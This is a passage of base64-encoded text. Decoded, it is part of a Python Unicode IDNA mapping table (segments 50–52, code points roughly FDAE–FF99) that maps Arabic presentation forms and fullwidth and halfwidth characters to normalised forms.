iAgICAoMHhGREFFLCBcJ01cJywgXCdceGQ5XHg4YVx4ZDhceGFkXHhkOVx4OGFcJyksXG4gICAgKDB4RkRBRiwgXCdNXCcsIFwnXHhkOVx4OGFceGQ4XHhhY1x4ZDlceDhhXCcpLFxuICAgICgweEZEQjAsIFwnTVwnLCBcJ1x4ZDlceDhhXHhkOVx4ODVceGQ5XHg4YVwnKSxcbiAgICAoMHhGREIxLCBcJ01cJywgXCdceGQ5XHg4NVx4ZDlceDg1XHhkOVx4OGFcJyksXG4gICAgKDB4RkRCMiwgXCdNXCcsIFwnXHhkOVx4ODJceGQ5XHg4NVx4ZDlceDhhXCcpLFxuICAgICgweEZEQjMsIFwnTVwnLCBcJ1x4ZDlceDg2XHhkOFx4YWRceGQ5XHg4YVwnKSxcbiAgICAoMHhGREI0LCBcJ01cJywgXCdceGQ5XHg4Mlx4ZDlceDg1XHhkOFx4YWRcJyksXG4gICAgKDB4RkRCNSwgXCdNXCcsIFwnXHhkOVx4ODRceGQ4XHhhZFx4ZDlceDg1XCcpLFxuICAgICgweEZEQjYsIFwnTVwnLCBcJ1x4ZDhceGI5XHhkOVx4ODVceGQ5XHg4YVwnKSxcbiAgICAoMHhGREI3LCBcJ01cJywgXCdceGQ5XHg4M1x4ZDlceDg1XHhkOVx4OGFcJyksXG4gICAgKDB4RkRCOCwgXCdNXCcsIFwnXHhkOVx4ODZceGQ4XHhhY1x4ZDhceGFkXCcpLFxuICAgICgweEZEQjksIFwnTVwnLCBcJ1x4ZDlceDg1XHhkOFx4YWVceGQ5XHg4YVwnKSxcbiAgICAoMHhGREJBLCBcJ01cJywgXCdceGQ5XHg4NFx4ZDhceGFjXHhkOVx4ODVcJyksXG4gICAgKDB4RkRCQiwgXCdNXCcsIFwnXHhkOVx4ODNceGQ5XHg4NVx4ZDlceDg1XCcpLFxuICAgICgweEZEQkMsIFwnTVwnLCBcJ1x4ZDlceDg0XHhkOFx4YWNceGQ5XHg4NVwnKSxcbiAgICAoMHhGREJELCBcJ01cJywgXCdceGQ5XHg4Nlx4ZDhceGFjXHhkOFx4YWRcJyksXG4gICAgKDB4RkRCRSwgXCdNXCcsIFwnXHhkOFx4YWNceGQ4XHhhZFx4ZDlceDhhXCcpLFxuICAgICgweEZEQkYsIFwnTVwnLCBcJ1x4ZDhceGFkXHhkOFx4YWNceGQ5XHg4YVwnKSxcbiAgICAoMHhGREMwLCBcJ01cJywgXCdceGQ5XHg4NVx4ZDhceGFjXHhkOVx4OGFcJyksXG4gICAgKDB4RkRDMSwgXCdNXCcsIFwnXHhkOVx4ODFceGQ5XHg4NVx4ZDlceDhhXCcpLFxuICAgICgweEZEQzIsIFwnTVwnLCBcJ1x4ZDhceGE4XHhkOFx4YWRceGQ5XHg4YVwnKSxcbiAgICAoMHhGREMzLCBcJ01cJywgXCdceGQ5XHg4M1x4ZDlceDg1XHhkOVx4ODVcJyksXG4gICAgKDB4RkRDNCwgXCdNXCcsIFwnXHhkOFx4YjlceGQ4XHhhY1x4ZDlceDg1XCcpLFxuICAgICgweEZEQzUsIFwnTVwnLCBcJ1x4ZDhceGI1XHhkOVx4ODVceGQ5XHg4NVwnKSxcbiAgICAoMHhGREM2LCBcJ01cJywgXCdceGQ4XHhiM1x4ZDhceGFlXHhkOVx4OGFcJyksXG4gICAgKDB4RkRDNywgXCdNXCcsIFwnXHhkOVx4ODZceGQ4XHhhY1x4ZDlceDhhXCcpLFxuICAgICgweEZEQzgsIFwnWFwnKSxcbiAgICAoMHhGRENGLCBcJ1ZcJyksXG4gICAgKDB4RkREMCwgXCdYXCcpLFxuICAgICgweEZERjAsIFwnTVwnLCBcJ1x4ZDhceGI1XHhkOVx4ODRceGRiXHg5MlwnKSxcbiAgICAoMHhGREYxLCBcJ01cJywgXCdceGQ5XHg4Mlx4ZDlceDg0XHhkYlx4OTJcJyksXG4gICAgKDB4RkRGMiwgXCdNXCcsIFwnXHhkOFx4YTdceGQ5XHg4NFx4ZDlceDg0XHhkOVx4ODdcJyksXG4gICAgKDB4RkRGMywgXCdNXCcsIFwnXHhkOFx4YTdceGQ5XHg4M1x4ZDhceGE4XHhkOFx4YjFcJyksXG4gICAgKDB4RkRGNCwgXCdNXCcsIFwnXHhkOVx4ODVceGQ4XHhhZFx4ZDlceDg1XHhkOFx4YWZcJyksXG4gICAgKDB4RkRGNSwgXCdNXCcsIFwnXHhkOFx4YjVceGQ5XHg4NFx4ZDhceGI5XHhkOVx4ODVcJyksXG4gICAgKDB4RkRGNiwgXCdNXCcsIFwnXHhkOFx4YjFceGQ4XHhiM1x4ZDlceDg4XHhkOVx4ODRcJyksXG4gICAgKDB4RkRGNywgXCdNXCcsIFwnXHhkOFx4YjlceGQ5XHg4NFx4ZDlceDhhXHhkOVx4ODdcJyksXG4gICAgKDB4RkRGOCwgXCdNXCcsIFwnXHhkOVx4ODhceGQ4XHhiM1x4ZDlceDg0XHhkOVx4ODVcJyksXG4gICAgKDB4RkRGOSwgXCdNXCcsIFwnXHhkOFx4YjVceGQ5XHg4NFx4ZDlceDg5XCcpLFxuICAgICgweEZERkEsIFwnM1wnLCBcJ1x4ZDhceGI1XHhkOVx4ODRceGQ5XHg4OSBceGQ4XHhhN1x4ZDlceDg0XHhkOVx4ODRceGQ5XHg4NyBceGQ4XHhiOVx4ZDlceDg0XHhkOVx4OGFceGQ5XHg4NyBceGQ5XHg4OFx4ZDhceGIzXHhkOVx4ODRceGQ5XHg4NVwnKSxcbiAgICAoMHhGREZCLCBcJzNcJywgXCdceGQ4XHhhY1x4ZDlceDg0IFx4ZDhceGFjXHhkOVx4ODRceGQ4XHhhN1x4ZDlceDg0XHhkOVx4ODdcJyksXG4gICAgKDB4RkRGQywgXCdNXCcsIFwnXHhkOFx4YjFceGRiXHg4Y1x4ZDhceGE3XHhkOVx4ODRcJyksXG4gICAgKDB4RkRGRCwgXCdWXCcpLFxuICAgICgweEZFMDAsIFwnSVwnKSxcbiAgICAoMHhGRTEwLCBcJzNcJywgXCcsXCcpLFxuICAgICgweEZFMTEsIFwnTVwnLCBcJ1x4ZTNceDgwXHg4MVwnKSxcbiAgICAoMHhGRTEyLCBcJ1hcJyksXG4gICAgKDB4RkUxMywgXCczXCcsIFwnOlwnKSxcbiAgICAoMHhGRTE0LCBcJzNcJywgXCc7XCcpLFxuICAgICgweEZFMTUsIFwnM1wnLCBcJyFcJyksXG4gICAgKDB4RkUxNiwgXCczXCcsIFwnP1wnKSxcbiAgICAoMHhGRTE3LCBcJ01cJywgXCdceGUzXHg4MFx4OTZcJyksXG4gICAgKDB4RkUxOCwgXCdNXCcsIFwnXHhlM1x4ODBceDk3XCcpLFxuICAgICgweEZFMTksIFwnWFwnKSxcbiAgICAoMHhGRTIwLCBcJ1ZcJyksXG4gICAgKDB4RkUzMCwgXCdYXCcpLFxuICAgICgweEZFMzEsIFwnTVwnLCBcJ1x4ZTJceDgwXHg5NFwnKSxcbiAgICAoMHhGRTMyLCBcJ01cJywgXCdceGUyXHg4MFx4OTNcJyksXG4gICAgKDB4RkUzMywgXCczXCcsIFwnX1wnKSxcbiAgICAoMHhGRTM1LCBcJzNcJywgXCcoXCcpLFxuICAgICgweEZFMzYsIFwnM1wnLCBcJylcJyksXG4gICAgKDB4RkUzNywgXCczXCcsIFwne1wnKSxcbiAgICAoMHhGRTM4LCBcJzNcJywgXCd9XCcpLFxuICAgICgweEZFMzksIFwnTVwnLCBcJ1x4ZTNceDgwXHg5NFwnKSxcbiAgICAoMHhGRTNBLCBcJ01cJywgXCdceGUzXHg4MFx4OTVcJyksXG4gICAgKDB4RkUzQiwgXCdNXCcsIFwnXHhlM1x4ODBceDkwXCcpLFxuICAgICgweEZFM0MsIFwnTVwnLCBcJ1x4ZTNceDgwXHg5MVwnKSxcbiAgICAoMHhGRTNELCBcJ01cJywgXCdceGUzXHg4MFx4OGFcJyksXG4gICAgKDB4RkUzRSwgXCdNXCcsIFwnXHhlM1x4ODBceDhiXCcpLFxuICAgICgweEZFM0YsIFwnTVwnLCBcJ1x4ZTNceDgwXHg4OFwnKSxcbiAgICAoMHhGRTQwLCBcJ01cJywgXCdceGUzXHg4MFx4ODlcJyksXG4gICAgKDB4RkU0MSwgXCdNXCcsIFwnXHhlM1x4ODBceDhjXCcpLFxuICAgICgweEZFNDIsIFwnTVwnLCBcJ1x4ZTNceDgwXHg4ZFwnKSxcbiAgICAoMHhGRTQzLCBcJ01cJywgXCdceGUzXHg4MFx4OGVcJyksXG4gICAgKDB4RkU0NCwgXCdNXCcsIFwnXHhlM1x4ODBceDhmXCcpLFxuICAgICgweEZFNDUsIFwnVlwnKSxcbiAgICAoMHhGRTQ3LCBcJzNcJywgXCdbXCcpLFxuICAgICgweEZFNDgsIFwnM1wnLCBcJ11cJyksXG4gICAgKDB4RkU0OSwgXCczXCcsIFwnIFx4Y2NceDg1XCcpLFxuICAgICgweEZFNEQsIFwnM1wnLCBcJ19cJyksXG4gICAgKDB4RkU1MCwgXCczXCcsIFwnLFwnKSxcbiAgICAoMHhGRTUxLCBcJ01cJywgXCdceGUzXHg4MFx4ODFcJyksXG4gICAgKDB4RkU1MiwgXCdYXCcpLFxuICAgICgweEZFNTQsIFwnM1wnLCBcJztcJyksXG4gICAgKDB4RkU1NSwgXCczXCcsIFwnOlwnKSxcbiAgICAoMHhGRTU2LCBcJzNcJywgXCc/XCcpLFxuICAgICgweEZFNTcsIFwnM1wnLCBcJyFcJyksXG4gICAgKDB4RkU1OCwgXCdNXCcsIFwnXHhlMlx4ODBceDk0XCcpLFxuICAgICgweEZFNTksIFwnM1wnLCBcJyhcJyksXG4gICAgKDB4RkU1QSwgXCczXCcsIFwnKVwnKSxcbiAgICAoMHhGRTVCLCBcJzNcJywgXCd7XCcpLFxuICAgICgweEZFNUMsIFwnM1wnLCBcJ31cJyksXG4gICAgKDB4RkU1RCwgXCdNXCcsIFwnXHhlM1x4ODBceDk0XCcpLFxuICAgIF1cblxuZGVmIF9zZWdfNTAoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweEZFNUUsIFwnTVwnLCBcJ1x4ZTNceDgwXHg5NVwnKSxcbiAgICAoMHhGRTVGLCBcJzNcJywgXCcjXCcpLFxuICAgICgweEZFNjAsIFwnM1wnLCBcJyZcJyksXG4gICAgKDB4RkU2MSwgXCczXCcsIFwnKlwnKSxcbiAgICAoMHhGRTYyLCBcJzNcJywgXCcrXCcpLFxuICAgICgweEZFNjMsIFwnTVwnLCBcJy1cJyksXG4gICAgKDB4RkU2NCwgXCczXCcsIFwnPFwnKSxcbiAgICAoMHhGRTY1LCBcJzNcJywgXCc+XCcpLFxuICAgICgweEZFNjYsIFwnM1wnLCBcJz1cJyksXG4gICAgKDB4RkU2NywgXCdYXCcpLFxuICAgICgweEZFNjgsIFwnM1wnLCBcJ1xcXFxcJyksXG4gICAgKDB4RkU2OSwgXCczXCcsIFwnJFwnKSxcbiAgICAoMHhGRTZBLCBcJzNcJywgXCclXCcpLFxuICAgICgweEZFNkIsIFwnM1wnLCBcJ0BcJyksXG4gICAgKDB4RkU2QywgXCdYXCcpLFxuICAgICgweEZFNzAsIFwnM1wnLCBcJyBceGQ5XHg4YlwnKSxcbiAgICAoMHhGRTcxLCBcJ01cJywgXCdceGQ5XHg4MFx4ZDlceDhiXCcpLFxuICAgICgweEZFNzIsIFwnM1wnLCBcJyBceGQ5XHg4Y1wnKSxcbiAgICAoMHhGRTczLCBcJ1ZcJyksXG4gICAgKDB4RkU3NCwgXCczXCcsIFwnIFx4ZDlceDhkXCcpLFxuICAgICgweEZFNzUsIFwnWFwnKSxcbiAgICAoMHhGRTc2LCBcJzNcJywgXCcgXHhkOVx4OGVcJyksXG4gICAgKDB4RkU3NywgXCdNXCcsIFwnXHhkOVx4ODBceGQ5XHg4ZVwnKSxcbiAgICAoMHhGRTc4LCBcJzNcJywgXCcgXHhkOVx4OGZcJyksXG4gICAgKDB4RkU3OSwgXCdNXCcsIFwnXHhkOVx4ODBceGQ5XHg4ZlwnKSxcbiAgICAoMHhGRTdBLCBcJzNcJywgXCcgXHhkOVx4OTBcJyksXG4gICAgKDB4RkU3QiwgXCdNXCcsIFwnXHhkOVx4ODBceGQ5XHg5MFwnKSxcbiAgICAoMHhGRTdDLCBcJzNcJywgXCcgXHhkOVx4OTFcJyksXG4gICAgKDB4RkU3RCwgXCdNXCcsIFwnXHhkOVx4ODBceGQ5XHg5MVwnKSxcbiAgICAoMHhGRTdFLCBcJzNcJywgXCcgXHhkOVx4OTJcJyksXG4gICAgKDB4RkU3RiwgXCdNXCcsIFwnXHhkOVx4ODBceGQ5XHg5MlwnKSxcbiAgICAoMHhGRTgwLCBcJ01cJywgXCdceGQ4XHhhMVwnKSxcbiAgICAoMHhGRTgxLCBcJ01cJywgXCdceGQ4XHhhMlwnKSxcbiAgICAoMHhGRTgzLCBcJ01cJywgXCdceGQ4XHhhM1wnKSxcbiAgICAoMHhGRTg1LCBcJ01cJywgXCdceGQ4XHhhNFwnKSxcbiAgICAoMHhGRTg3LCBcJ01cJywgXCdceGQ4XHhhNVwnKSxcbiAgICAoMHhGRTg5LCBcJ01cJywgXCdceGQ4XHhhNlwnKSxcbiAgICAoMHhGRThELCBcJ01cJywgXCdceGQ4XHhhN1wnKSxcbiAgICAoMHhGRThGLCBcJ01cJywgXCdceGQ4XHhhOFwnKSxcbiAgICAoMHhGRTkzLCBcJ01cJywgXCdceGQ4XHhhOVwnKSxcbiAgICAoMHhGRTk1LCBcJ01cJywgXCdceGQ4XHhhYVwnKSxcbiAgICAoMHhGRTk5LCBcJ01cJywgXCdceGQ4XHhhYlwnKSxcbiAgICAoMHhGRTlELCBcJ01cJywgXCdceGQ4XHhhY1wnKSxcbiAgICAoMHhGRUExLCBcJ01cJywgXCdceGQ4XHhhZFwnKSxcbiAgICAoMHhGRUE1LCBcJ01cJywgXCdceGQ4XHhhZVwnKSxcbiAgICAoMHhGRUE5LCBcJ01cJywgXCdceGQ4XHhhZlwnKSxcbiAgICAoMHhGRUFCLCBcJ01cJywgXCdceGQ4XHhiMFwnKSxcbiAgICAoMHhGRUFELCBcJ01cJywgXCdceGQ4XHhiMVwnKSxcbiAgICAoMHhGRUFGLCBcJ01cJywgXCdceGQ4XHhiMlwnKSxcbiAgICAoMHhGRUIxLCBcJ01cJywgXCdceGQ4XHhiM1wnKSxcbiAgICAoMHhGRUI1LCBcJ01cJywgXCdceGQ4XHhiNFwnKSxcbiAgICAoMHhGRUI5LCBcJ01cJywgXCdceGQ4XHhiNVwnKSxcbiAgICAoMHhGRUJELCBcJ01cJywgXCdceGQ4XHhiNlwnKSxcbiAgICAoMHhGRUMxLCBcJ01cJywgXCdceGQ4XHhiN1wnKSxcbiAgICAoMHhGRUM1LCBcJ01cJywgXCdceGQ4XHhiOFwnKSxcbiAgICAoMHhGRUM5LCBcJ01cJywgXCdceGQ4XHhiOVwnKSxcbiAgICAoMHhGRUNELCBcJ01cJywgXCdceGQ4XHhiYVwnKSxcbiAgICAoMHhGRUQxLCBcJ01cJywgXCdceGQ5XHg4MVwnKSxcbiAgICAoMHhGRUQ1LCBcJ01cJywgXCdceGQ5XHg4MlwnKSxcbiAgICAoMHhGRUQ5LCBcJ01cJywgXCdceGQ5XHg4M1wnKSxcbiAgICAoMHhGRURELCBcJ01cJywgXCdceGQ5XHg4NFwnKSxcbiAgICAoMHhGRUUxLCBcJ01cJywgXCdceGQ5XHg4NVwnKSxcbiAgICAoMHhGRUU1LCBcJ01cJywgXCdceGQ5XHg4NlwnKSxcbiAgICAoMHhGRUU5LCBcJ01cJywgXCdceGQ5XHg4N1wnKSxcbiAgICAoMHhGRUVELCBcJ01cJywgXCdceGQ5XHg4OFwnKSxcbiAgICAoMHhGRUVGLCBcJ01cJywgXCdceGQ5XHg4OVwnKSxcbiAgICAoMHhGRUYxLCBcJ01cJywgXCdceGQ5XHg4YVwnKSxcbiAgICAoMHhGRUY1LCBcJ01cJywgXCdceGQ5XHg4NFx4ZDhceGEyXCcpLFxuICAgICgweEZFRjcsIFwnTVwnLCBcJ1x4ZDlceDg0XHhkOFx4YTNcJyksXG4gICAgKDB4RkVGOSwgXCdNXCcsIFwnXHhkOVx4ODRceGQ4XHhhNVwnKSxcbiAgICAoMHhGRUZCLCBcJ01cJywgXCdceGQ5XHg4NFx4ZDhceGE3XCcpLFxuICAgICgweEZFRkQsIFwnWFwnKSxcbiAgICAoMHhGRUZGLCBcJ0lcJyksXG4gICAgKDB4RkYwMCwgXCdYXCcpLFxuICAgICgweEZGMDEsIFwnM1wnLCBcJyFcJyksXG4gICAgKDB4RkYwMiwgXCczXCcsIFwnIlwnKSxcbiAgICAoMHhGRjAzLCBcJzNcJywgXCcjXCcpLFxuICAgICgweEZGMDQsIFwnM1wnLCBcJyRcJyksXG4gICAgKDB4RkYwNSwgXCczXCcsIFwnJVwnKSxcbiAgICAoMHhGRjA2LCBcJzNcJywgXCcmXCcpLFxuICAgICgweEZGMDcsIFwnM1wnLCBcJ1xcXCdcJyksXG4gICAgKDB4RkYwOCwgXCczXCcsIFwnKFwnKSxcbiAgICAoMHhGRjA5LCBcJzNcJywgXCcpXCcpLFxuICAgICgweEZGMEEsIFwnM1wnLCBcJypcJyksXG4gICAgKDB4RkYwQiwgXCczXCcsIFwnK1wnKSxcbiAgICAoMHhGRjBDLCBcJzNcJywgXCcsXCcpLFxuICAgICgweEZGMEQsIFwnTVwnLCBcJy1cJyksXG4gICAgKDB4RkYwRSwgXCdNXCcsIFwnLlwnKSxcbiAgICAoMHhGRjBGLCBcJzNcJywgXCcvXCcpLFxuICAgICgweEZGMTAsIFwnTVwnLCBcJzBcJyksXG4gICAgKDB4RkYxMSwgXCdNXCcsIFwnMVwnKSxcbiAgICAoMHhGRjEyLCBcJ01cJywgXCcyXCcpLFxuICAgICgweEZGMTMsIFwnTVwnLCBcJzNcJyksXG4gICAgKDB4RkYxNCwgXCdNXCcsIFwnNFwnKSxcbiAgICAoMHhGRjE1LCBcJ01cJywgXCc1XCcpLFxuICAgICgweEZGMTYsIFwnTVwnLCBcJzZcJyksXG4gICAgKDB4RkYxNywgXCdNXCcsIFwnN1wnKSxcbiAgICAoMHhGRjE4LCBcJ01cJywgXCc4XCcpLFxuICAgICgweEZGMTksIFwnTVwnLCBcJzlcJyksXG4gICAgKDB4RkYxQSwgXCczXCcsIFwnOlwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzUxKCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHhGRjFCLCBcJzNcJywgXCc7XCcpLFxuICAgICgweEZGMUMsIFwnM1wnLCBcJzxcJyksXG4gICAgKDB4RkYxRCwgXCczXCcsIFwnPVwnKSxcbiAgICAoMHhGRjFFLCBcJzNcJywgXCc+XCcpLFxuICAgICgweEZGMUYsIFwnM1wnLCBcJz9cJyksXG4gICAgKDB4RkYyMCwgXCczXCcsIFwnQFwnKSxcbiAgICAoMHhGRjIxLCBcJ01cJywgXCdhXCcpLFxuICAgICgweEZGMjIsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4RkYyMywgXCdNXCcsIFwnY1wnKSxcbiAgICAoMHhGRjI0LCBcJ01cJywgXCdkXCcpLFxuICAgICgweEZGMjUsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4RkYyNiwgXCdNXCcsIFwnZlwnKSxcbiAgICAoMHhGRjI3LCBcJ01cJywgXCdnXCcpLFxuICAgICgweEZGMjgsIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4RkYyOSwgXCdNXCcsIFwnaVwnKSxcbiAgICAoMHhGRjJBLCBcJ01cJywgXCdqXCcpLFxuICAgICgweEZGMkIsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4RkYyQywgXCdNXCcsIFwnbFwnKSxcbiAgICAoMHhGRjJELCBcJ01cJywgXCdtXCcpLFxuICAgICgweEZGMkUsIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4RkYyRiwgXCdNXCcsIFwnb1wnKSxcbiAgICAoMHhGRjMwLCBcJ01cJywgXCdwXCcpLFxuICAgICgweEZGMzEsIFwnTVwnLCBcJ3FcJyksXG4gICAgKDB4RkYzMiwgXCdNXCcsIFwnclwnKSxcbiAgICAoMHhGRjMzLCBcJ01cJywgXCdzXCcpLFxuICAgICgweEZGMzQsIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4RkYzNSwgXCdNXCcsIFwndVwnKSxcbiAgICAoMHhGRjM2LCBcJ01cJywgXCd2XCcpLFxuICAgICgweEZGMzcsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4RkYzOCwgXCdNXCcsIFwneFwnKSxcbiAgICAoMHhGRjM5LCBcJ01cJywgXCd5XCcpLFxuICAgICgweEZGM0EsIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4RkYzQiwgXCczXCcsIFwnW1wnKSxcbiAgICAoMHhGRjNDLCBcJzNcJywgXCdcXFxcXCcpLFxuICAgICgweEZGM0QsIFwnM1wnLCBcJ11cJyksXG4gICAgKDB4RkYzRSwgXCczXCcsIFwnXlwnKSxcbiAgICAoMHhGRjNGLCBcJzNcJywgXCdfXCcpLFxuICAgICgweEZGNDAsIFwnM1wnLCBcJ2BcJyksXG4gICAgKDB4RkY0MSwgXCdNXCcsIFwnYVwnKSxcbiAgICAoMHhGRjQyLCBcJ01cJywgXCdiXCcpLFxuICAgICgweEZGNDMsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4RkY0NCwgXCdNXCcsIFwnZFwnKSxcbiAgICAoMHhGRjQ1LCBcJ01cJywgXCdlXCcpLFxuICAgICgweEZGNDYsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4RkY0NywgXCdNXCcsIFwnZ1wnKSxcbiAgICAoMHhGRjQ4LCBcJ01cJywgXCdoXCcpLFxuICAgICgweEZGNDksIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4RkY0QSwgXCdNXCcsIFwnalwnKSxcbiAgICAoMHhGRjRCLCBcJ01cJywgXCdrXCcpLFxuICAgICgweEZGNEMsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4RkY0RCwgXCdNXCcsIFwnbVwnKSxcbiAgICAoMHhGRjRFLCBcJ01cJywgXCduXCcpLFxuICAgICgweEZGNEYsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4RkY1MCwgXCdNXCcsIFwncFwnKSxcbiAgICAoMHhGRjUxLCBcJ01cJywgXCdxXCcpLFxuICAgICgweEZGNTIsIFwnTVwnLCBcJ3JcJyksXG4gICAgKDB4RkY1MywgXCdNXCcsIFwnc1wnKSxcbiAgICAoMHhGRjU0LCBcJ01cJywgXCd0XCcpLFxuICAgICgweEZGNTUsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4RkY1NiwgXCdNXCcsIFwndlwnKSxcbiAgICAoMHhGRjU3LCBcJ01cJywgXCd3XCcpLFxuICAgICgweEZGNTgsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4RkY1OSwgXCdNXCcsIFwneVwnKSxcbiAgICAoMHhGRjVBLCBcJ01cJywgXCd6XCcpLFxuICAgICgweEZGNUIsIFwnM1wnLCBcJ3tcJyksXG4gICAgKDB4RkY1QywgXCczXCcsIFwnfFwnKSxcbiAgICAoMHhGRjVELCBcJzNcJywgXCd9XCcpLFxuICAgICgweEZGNUUsIFwnM1wnLCBcJ35cJyksXG4gICAgKDB4RkY1RiwgXCdNXCcsIFwnXHhlMlx4YTZceDg1XCcpLFxuICAgICgweEZGNjAsIFwnTVwnLCBcJ1x4ZTJceGE2XHg4NlwnKSxcbiAgICAoMHhGRjYxLCBcJ01cJywgXCcuXCcpLFxuICAgICgweEZGNjIsIFwnTVwnLCBcJ1x4ZTNceDgwXHg4Y1wnKSxcbiAgICAoMHhGRjYzLCBcJ01cJywgXCdceGUzXHg4MFx4OGRcJyksXG4gICAgKDB4RkY2NCwgXCdNXCcsIFwnXHhlM1x4ODBceDgxXCcpLFxuICAgICgweEZGNjUsIFwnTVwnLCBcJ1x4ZTNceDgzXHhiYlwnKSxcbiAgICAoMHhGRjY2LCBcJ01cJywgXCdceGUzXHg4M1x4YjJcJyksXG4gICAgKDB4RkY2NywgXCdNXCcsIFwnXHhlM1x4ODJceGExXCcpLFxuICAgICgweEZGNjgsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhM1wnKSxcbiAgICAoMHhGRjY5LCBcJ01cJywgXCdceGUzXHg4Mlx4YTVcJyksXG4gICAgKDB4RkY2QSwgXCdNXCcsIFwnXHhlM1x4ODJceGE3XCcpLFxuICAgICgweEZGNkIsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhOVwnKSxcbiAgICAoMHhGRjZDLCBcJ01cJywgXCdceGUzXHg4M1x4YTNcJyksXG4gICAgKDB4RkY2RCwgXCdNXCcsIFwnXHhlM1x4ODNceGE1XCcpLFxuICAgICgweEZGNkUsIFwnTVwnLCBcJ1x4ZTNceDgzXHhhN1wnKSxcbiAgICAoMHhGRjZGLCBcJ01cJywgXCdceGUzXHg4M1x4ODNcJyksXG4gICAgKDB4RkY3MCwgXCdNXCcsIFwnXHhlM1x4ODNceGJjXCcpLFxuICAgICgweEZGNzEsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhMlwnKSxcbiAgICAoMHhGRjcyLCBcJ01cJywgXCdceGUzXHg4Mlx4YTRcJyksXG4gICAgKDB4RkY3MywgXCdNXCcsIFwnXHhlM1x4ODJceGE2XCcpLFxuICAgICgweEZGNzQsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhOFwnKSxcbiAgICAoMHhGRjc1LCBcJ01cJywgXCdceGUzXHg4Mlx4YWFcJyksXG4gICAgKDB4RkY3NiwgXCdNXCcsIFwnXHhlM1x4ODJceGFiXCcpLFxuICAgICgweEZGNzcsIFwnTVwnLCBcJ1x4ZTNceDgyXHhhZFwnKSxcbiAgICAoMHhGRjc4LCBcJ01cJywgXCdceGUzXHg4Mlx4YWZcJyksXG4gICAgKDB4RkY3OSwgXCdNXCcsIFwnXHhlM1x4ODJceGIxXCcpLFxuICAgICgweEZGN0EsIFwnTVwnLCBcJ1x4ZTNceDgyXHhiM1wnKSxcbiAgICAoMHhGRjdCLCBcJ01cJywgXCdceGUzXHg4Mlx4YjVcJyksXG4gICAgKDB4RkY3QywgXCdNXCcsIFwnXHhlM1x4ODJceGI3XCcpLFxuICAgICgweEZGN0QsIFwnTVwnLCBcJ1x4ZTNceDgyXHhiOVwnKSxcbiAgICAoMHhGRjdFLCBcJ01cJywgXCdceGUzXHg4Mlx4YmJcJyksXG4gICAgXVxuXG5kZWYgX3NlZ181MigpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4RkY3RiwgXCdNXCcsIFwnXHhlM1x4ODJceGJkXCcpLFxuICAgICgweEZGODAsIFwnTVwnLCBcJ1x4ZTNceDgyXHhiZlwnKSxcbiAgICAoMHhGRjgxLCBcJ01cJywgXCdceGUzXHg4M1x4ODFcJyksXG4gICAgKDB4RkY4MiwgXCdNXCcsIFwnXHhlM1x4ODNceDg0XCcpLFxuICAgICgweEZGODMsIFwnTVwnLCBcJ1x4ZTNceDgzXHg4NlwnKSxcbiAgICAoMHhGRjg0LCBcJ01cJywgXCdceGUzXHg4M1x4ODhcJyksXG4gICAgKDB4RkY4NSwgXCdNXCcsIFwnXHhlM1x4ODNceDhhXCcpLFxuICAgICgweEZGODYsIFwnTVwnLCBcJ1x4ZTNceDgzXHg4YlwnKSxcbiAgICAoMHhGRjg3LCBcJ01cJywgXCdceGUzXHg4M1x4OGNcJyksXG4gICAgKDB4RkY4OCwgXCdNXCcsIFwnXHhlM1x4ODNceDhkXCcpLFxuICAgICgweEZGODksIFwnTVwnLCBcJ1x4ZTNceDgzXHg4ZVwnKSxcbiAgICAoMHhGRjhBLCBcJ01cJywgXCdceGUzXHg4M1x4OGZcJyksXG4gICAgKDB4RkY4QiwgXCdNXCcsIFwnXHhlM1x4ODNceDkyXCcpLFxuICAgICgweEZGOEMsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5NVwnKSxcbiAgICAoMHhGRjhELCBcJ01cJywgXCdceGUzXHg4M1x4OThcJyksXG4gICAgKDB4RkY4RSwgXCdNXCcsIFwnXHhlM1x4ODNceDliXCcpLFxuICAgICgweEZGOEYsIFwnTVwnLCBcJ1x4ZTNceDgzXHg5ZVwnKSxcbiAgICAoMHhGRjkwLCBcJ01cJywgXCdceGUzXHg4M1x4OWZcJyksXG4gICAgKDB4RkY5MSwgXCdNXCcsIFwnXHhlM1x4ODNceGEwXCcpLFxuICAgICgweEZGOTIsIFwnTVwnLCBcJ1x4ZTNceDgzXHhhMVwnKSxcbiAgICAoMHhGRjkzLCBcJ01cJywgXCdceGUzXHg4M1x4YTJcJyksXG4gICAgKDB4RkY5NCwgXCdNXCcsIFwnXHhlM1x4ODNceGE0XCcpLFxuICAgICgweEZGOTUsIFwnTVwnLCBcJ1x4ZTNceDgzXHhhNlwnKSxcbiAgICAoMHhGRjk2LCBcJ01cJywgXCdceGUzXHg4M1x4YThcJyksXG4gICAgKDB4RkY5NywgXCdNXCcsIFwnXHhlM1x4ODNceGE5XCcpLFxuICAgICgweEZGOTgsIFwnTVwnLCBcJ1x4ZTNceDgzXHhhYVwnKSxcbiAgICAoMHhGRjk5LCBcJ01cJyw